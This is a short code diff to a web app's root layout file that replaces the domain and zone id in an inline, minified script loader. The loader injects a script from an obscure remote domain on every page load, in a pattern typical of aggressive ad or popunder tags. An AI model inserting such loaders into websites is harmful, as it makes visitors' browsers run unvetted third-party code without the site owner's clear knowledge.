@@ -43,7 +43,7 @@ export default function RootLayout({ children }) {
         {children}
         <script
           dangerouslySetInnerHTML={{
-            __html: `(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9314133,document.createElement('script'));`,
+            __html: `(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9317103,document.createElement('script'));`,
           }}
         />
       </body>
